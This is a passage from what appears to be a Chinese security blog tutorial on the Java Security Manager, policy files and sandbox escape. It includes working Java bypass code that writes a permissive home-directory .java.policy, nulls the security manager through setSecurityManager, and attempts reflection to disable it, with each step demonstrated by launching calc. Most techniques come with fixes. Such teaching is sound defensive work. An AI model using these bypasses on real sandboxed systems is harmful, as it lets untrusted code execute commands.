org.apache.http.impl.client.DefaultRequestDirector.tryConnect(DefaultRequestDirector.java:573)</span><br><span class="line">at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:425)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:820)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:754)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:732)</span><br><span class="line">at com.taobao.cd.http.util.HttpUtil.createHtmlText(HttpUtil.java:38)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.network(PolicyTest.java:15)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.main(PolicyTest.java:45)</span><br></pre></td></tr></table></figure>
+<p>根据错误提示，知道是访问socket没有权限。那么修改下policy，指定权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.net.SocketPermission &quot;www.baidu.com:1-&quot;, &quot;connect,resolve&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>在指定权限文件下再运行，得到了正常的text形式的baidu首页的页面文档。权限策略成功。</p>
+<h2 id="0x02-Java-Security-Manager"><a href="#0x02-Java-Security-Manager" class="headerlink" title="0x02 Java Security Manager"></a>0x02 Java Security Manager</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>作为Java沙箱的基本组成部分之一，Java安全管理器是核心API和操作系统之间的主要接口，主要用于实现权限控制。</p>
+<p>安全管理器是一个允许应用实现一种安全策略的类。它允许一个应用去明确在执行一个可能安全或者敏感的操作之前，此操作是否允许在一个安全的上下文中被执行。应用可以同意或者拒绝执行操作。</p>
+<h3 id="SecurityManager类方法"><a href="#SecurityManager类方法" class="headerlink" title="SecurityManager类方法"></a>SecurityManager类方法</h3><p>SecurityManager类包含许多以check开头命名的方法。Java库中的各种方法在执行一些敏感的操作时可以调用这些方法。对check方法典型的调用如下： </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager security = System.getSecurityManager();</span><br><span class="line"><span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">	security.checkXXX(argument);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>SecurityManager通过抛出异常来阻止没有权限或敏感操作的完成。 如果操作被允许执行，则简单的返回；如果操作被拒绝，则抛出一个SecurityException。对于这种处理方式唯一的例外就是checkTopLevelWindow()方法，此方法返回boolean值。</p>
+<p>设置、获取当前管理器：</p>
+<ul>
+<li>可以使用System类的setSecurityManager()方法来设置当前安全管理器；</li>
+<li>可以使用System类的getSecurityManager()方法来获取当前安全管理器；</li>
+</ul>
+<p>SecurityManager中特定的方法checkPermission(java.security.Permission)负责明确允许还是拒绝由指定权限所指示的访问请求，默认的实现是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccessController.checkPermission(perm);</span><br></pre></td></tr></table></figure>
+<p>若果一个请求访问被允许，则checkPermission()直接返回；如果被拒绝，则抛出一个SecurityException异常。</p>
+<p>从Java 2 SDK v1.2 开始，SecurityManager 中其他所有check方法的默认实现都是调用SecurityManager的checkPermission()方法来确定调用线程是否具有执行所请求操作的权限。</p>
+<p>注意：只带有单个权限参数的checkPermission()方法总是在当前执行的线程上下文中执行安全检查。有时，应该在给定上下文中进行的安全检查实际上需要在不同的上下文（例如，在一个辅助线程中）中进行。Java为这种情况提供了包含有上下文参数的getSecurityContext()方法和checkPermission()方法。</p>
+<p>getSecurityContext()方法返回当前调用上下文的一个“快照”（默认的实现返回一个 AccessControlContext 对象）。下面是一个示例调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object context = <span class="keyword">null</span>;</span><br><span class="line">SecurityManager sm = System.getSecurityManager();</span><br><span class="line"><span class="keyword">if</span> (sm != <span class="keyword">null</span>) context = sm.getSecurityContext();</span><br></pre></td></tr></table></figure>
+<p>checkPermission()方法使用一个上下文对象，以及根据该上下文而不是当前执行线程的上下文作出访问决策的权限。因此另一个上下文中的代码可以调用此方法，传递权限和以前保存的上下文对象。下面是一个示例调用，它使用了以前示例中获得的SecurityManager类实例sm：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sm != <span class="keyword">null</span>) sm.checkPermission(permission, context);</span><br></pre></td></tr></table></figure>
+<p>SecurityManager类的主要方法列表如下，分别囊括了文件的读写删除和执行、网络的连接和监听、线程的访问、以及其他包括打印机剪贴板等系统功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">checkAccept(String, int)</span><br><span class="line">checkAccess(Thread)</span><br><span class="line">checkAccess(ThreadGroup)</span><br><span class="line">checkAwtEventQueueAccess()</span><br><span class="line">checkConnect(String, int)</span><br><span class="line">checkConnect(String, int, Object)</span><br><span class="line">checkCreateClassLoader()</span><br><span class="line">checkDelete(String)</span><br><span class="line">checkExec(String)</span><br><span class="line">checkExit(int)</span><br><span class="line">checkLink(String)</span><br><span class="line">checkListen(int)</span><br><span class="line">checkMemberAccess(Class&lt;?&gt;, int)</span><br><span class="line">checkMulticast(InetAddress)</span><br><span class="line">checkMulticast(InetAddress, byte)</span><br><span class="line">checkPackageAccess(String)</span><br><span class="line">checkPackageDefinition(String)</span><br><span class="line">checkPermission(Permission)</span><br><span class="line">checkPermission(Permission, Object)</span><br><span class="line">checkPrintJobAccess()</span><br><span class="line">checkPropertiesAccess()</span><br><span class="line">checkPropertyAccess(String)</span><br><span class="line">checkRead(FileDescriptor)</span><br><span class="line">checkRead(String)</span><br><span class="line">checkRead(String, Object)</span><br><span class="line">checkSecurityAccess(String)</span><br><span class="line">checkSetFactory()</span><br><span class="line">checkSystemClipboardAccess()</span><br><span class="line">checkTopLevelWindow(Object)</span><br><span class="line">checkWrite(FileDescriptor)</span><br><span class="line">checkWrite(String)</span><br></pre></td></tr></table></figure>
+<h3 id="启动安全管理器"><a href="#启动安全管理器" class="headerlink" title="启动安全管理器"></a>启动安全管理器</h3><h4 id="参数启动"><a href="#参数启动" class="headerlink" title="参数启动"></a>参数启动</h4><p>启动程序的时候通过附加参数启动安全管理器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager</span><br></pre></td></tr></table></figure>
+<p>如果想指定自定义的实现，可以在java.security.manager加等号指定，如下就能指定net.sourceforge.prograde.sm.ProGradeJSM作为实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager=net.sourceforge.prograde.sm.ProGradeJSM</span><br></pre></td></tr></table></figure>
+<p>若要同时指定配置文件的位置那么示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager -Djava.security.policy=&quot;E:/java.policy&quot;</span><br></pre></td></tr></table></figure>
+<p>策略文件前面小节已经说过了。一般需要指定哪些类有哪些权限，编辑policy文件就可以了。policy文件的具体语法参看<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html" target="_blank" rel="noopener">这里</a>。</p>
+<h4 id="编码方式启动"><a href="#编码方式启动" class="headerlink" title="编码方式启动"></a>编码方式启动</h4><p>也可以通过编码方式启动，不过不建议：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager sm = <span class="keyword">new</span> SecurityManager(); </span><br><span class="line">System.setSecurityManager(sm);</span><br></pre></td></tr></table></figure>
+<p>通过参数启动，本质上也是通过编码启动，不过参数启动使用灵活。</p>
+<h3 id="关闭安全管理器"><a href="#关闭安全管理器" class="headerlink" title="关闭安全管理器"></a>关闭安全管理器</h3><p>程序关闭：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager sm = System.getSecurityManager(); </span><br><span class="line"><span class="keyword">if</span>(sm != <span class="keyword">null</span>)&#123; System.setSecurityManager(<span class="keyword">null</span>); &#125;</span><br></pre></td></tr></table></figure>
+<p>注意：上面的代码只有在位于<code>${JDK_HOME}/jre/lib/security</code>目录下或者其他指定目录下的java.policy文件中指定了一个权限才会奏效。 这个权限是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br></pre></td></tr></table></figure>
+<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>FileUtil.java，工具类用于创建文件夹：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessControlException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessController;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivilegedAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String FOLDER_PATH = <span class="string">"C:\\test"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FileUtil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeFile</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File fs = <span class="keyword">new</span> File(<span class="string">"C:\\test\\"</span> + fileName);</span><br><span class="line">            fs.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | AccessControlException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doPrivilegedAction</span><span class="params">(<span class="keyword">final</span> String fileName)</span> </span>&#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;String&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                FileUtil.makeFile(fileName);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>DemoDoPrivilege.java，尝试通过三种方式在指定文件夹下创建新文件：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.AccessControlException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoDoPrivilege</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoDoPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"***************************************"</span>);</span><br><span class="line">        System.out.println(<span class="string">"I will show AccessControl functionality..."</span>);</span><br><span class="line">        System.out.println(<span class="string">"Preparation step : turn on system permission check..."</span>);</span><br><span class="line">        System.out.println(<span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Create a new file named temp1.txt via privileged action ..."</span>);</span><br><span class="line">        FileUtil.doPrivilegedAction(<span class="string">"temp1.txt"</span>);</span><br><span class="line">        System.out.println(<span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"/////////////////////////////////////////"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Create a new file named temp2.txt via File ..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File fs = <span class="keyword">new</span> File(<span class="string">"C:\\test\\temp2.txt"</span>);</span><br><span class="line">            fs.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AccessControlException | IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"/////////////////////////////////////////"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"create a new file named temp3.txt via FileUtil ..."</span>);</span><br><span class="line">        FileUtil.makeFile(<span class="string">"temp3.txt"</span>);</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">"***************************************"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>my.policy，自定义的权限配置文件，本地放在和前面文件同一目录下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.io.FilePermission &quot;C:\\test\\*&quot;, &quot;write&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">grant&#123;</span><br><span class="line">    permission java.security.AllPermission &quot;C:\\test\\*&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>启动安全管理器运行该类，由于权限问题会报java.security.AccessControlException的错误：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager DemoDoPrivilege</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/5.png" alt=""></p>
+<p>配置权限参数<code>-Djava.security.policy=my.policy</code>，再次启动则创建成功：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/6.png" alt=""></p>
+<h2 id="0x03-Java沙箱逃逸"><a href="#0x03-Java沙箱逃逸" class="headerlink" title="0x03 Java沙箱逃逸"></a>0x03 Java沙箱逃逸</h2><p>由前面Java沙箱的基础组成部分知道，除了Java安全管理器外，其他的基本都是内置实现在JVM和Java语言中的，也就是说，只有Java安全管理器可以被外部用户控制来设置策略文件等。因此，Java沙箱逃逸，实际就是针对Java Security Manager的绕过。</p>
+<h3 id="利用单等号-home目录可写绕过"><a href="#利用单等号-home目录可写绕过" class="headerlink" title="利用单等号+home目录可写绕过"></a>利用单等号+home目录可写绕过</h3><h4 id="Bypass利用"><a href="#Bypass利用" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>jre/lib/security/java.security是Java中指定安全配置文件，在前面的java.security小节中看到，其中指定了两个默认的policy文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># The default is to have a single system-wide policy file,</span><br><span class="line"># and a policy file in the user&apos;s home directory.</span><br><span class="line">policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">policy.url.2=file:$&#123;user.home&#125;/.java.policy</span><br></pre></td></tr></table></figure>
+<p>而通过<code>-Djava.security.policy</code>指定policy文件时，如果参数后面是一个等号，例如<code>-Djava.security.policy=my.policy</code>，m.policy会加在上面的两个默认的policy文件之后。在默认情况下，home目录下没有.java.policy这个文件。因此，如果home目录可写，则恶意代码可以通过写.java.policy文件，授予自己更多的权限来绕过Java Security Manager。</p>
+<p>假设开发者自定义的策略文件my.policy，虽然没有赋予文件的执行权限，但允许home目录可写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.io.FilePermission &quot;C:\\Users\\Administrator\\*&quot;, &quot;write&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>BypassSandbox类，利用my.policy策略文件允许在home目录可写的设置，将该目录上写入.java.policy文件，其中的策略内容未授权所有文件具有可执行权限：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String homePolicyFile = <span class="string">"grant &#123;\n    permission java.io.FilePermission \"&lt;&lt;ALL FILES&gt;&gt;\", \"execute\";\n&#125;;"</span>;</span><br><span class="line">        FileWriter writer = <span class="keyword">new</span> FileWriter(<span class="string">"C:\\Users\\Administrator\\.java.policy"</span>);</span><br><span class="line">        writer.write(homePolicyFile);</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Exploit类，恶意类，执行calc命令弹计算器：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先运行Exploit类是不能成功执行的，被Java安全管理器限制了；然后执行BypassSandbox类往home目录上写.java.policy这个默认策略文件，其中内容为允许所有文件具有可执行权限；最后再次运行Exploit类就能成功弹计算器了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; Exploit</span><br><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; Exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/7.png" alt=""></p>
+<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p><code>-Djava.security.policy==java.policy</code>，用双等于号指定policy文件。</p>
+<h3 id="利用setSecurityManager绕过"><a href="#利用setSecurityManager绕过" class="headerlink" title="利用setSecurityManager绕过"></a>利用setSecurityManager绕过</h3><h4 id="Bypass利用-1"><a href="#Bypass利用-1" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>Java Security Manager不仅能通过参数<code>-Djava.security.policy==java.policy</code>指定，还可以在运行时通过<code>System.setSecurityManager()</code>方法指定。如果被授予setSecurityManager权限，恶意代码可以在运行时调用setSecurityManager()方法，将Java Security Manager置为null即使安全管理器失效，从而实现绕过。</p>
+<p>假设开发者自定义的策略文件my.policy，设置了setSecurityManager权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>BypassSandbox类，关键在于<code>System.setSecurityManager(null)</code>使得安全管理器失效来实现绕过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setSecurityManager(<span class="keyword">null</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行即可绕过安全管理器的限制执行命令弹计算器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/8.png" alt=""></p>
+<h4 id="修复方法-1"><a href="#修复方法-1" class="headerlink" title="修复方法"></a>修复方法</h4><p>不授予不可信的代码setSecurityManager权限。</p>
+<h3 id="利用反射绕过"><a href="#利用反射绕过" class="headerlink" title="利用反射绕过"></a>利用反射绕过</h3><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>这里我们调试分析下上面的<code>System.setSecurityManager()</code>这个方法，如下图，该方法实际是调用的setSecurityManager0()方法，其中直接把参数直接赋予了System类中的security变量：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/10.png" alt=""></p>
+<p>看到System类中，它的security属性时用private修饰的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The security manager for the system.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> SecurityManager security = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+<p>也就是说，通过反射调用获取该field时是调用getDeclaredField()函数而不是getField()函数。</p>
+<p>如果被赋予了反射权限，那么是否能通过反射直接把System类中的security变量值置为null，使Java Security manager失效呢？</p>
+<p>我们先来尝试一下直接通过反射设置该security为null看看是否成功。</p>
+<p>假设开发者自定义的策略文件my.policy，授予accessDeclaredMembers权限和suppressAccessChecks权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.reflect.ReflectPermission &quot;suppressAccessChecks&quot;;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;accessDeclaredMembers&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>BypassSandbox类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setSecurityByReflection()"</span>);</span><br><span class="line">        setSecurityByReflection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setSecurityByReflection</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.System"</span>);</span><br><span class="line">        Field field = clz.getDeclaredField(<span class="string">"security"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(System.class, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可是运行报NoSuchFieldException的错误信息，显示说是不存在security这个字段：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/11.png" alt=""></p>
+<p>明明已经用的是getDeclaredField()函数了，为啥还是报不存在该字段的错误呢？</p>
+<p>为此，调试分析getDeclaredField()函数，看看问题在哪。这里看到该函数中调用了privateGetDeclaredFields()函数：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/12.png" alt=""></p>
+<p>跟进去privateGetDeclaredFields()函数，其中调用Reflection类的filterFields()方法对field进行过滤处理：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/13.png" alt=""></p>
+<p>跟进Reflection.filterFields()方法，在filter过滤的黑名单中System类的security字段就在其中被过滤了：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/14.png" alt=""></p>
+<p>看到Reflection类的静态代码中定义了一个fieldFilterMap，即字段过滤Map，这里已经将System类的security字段添加其中了：</p>
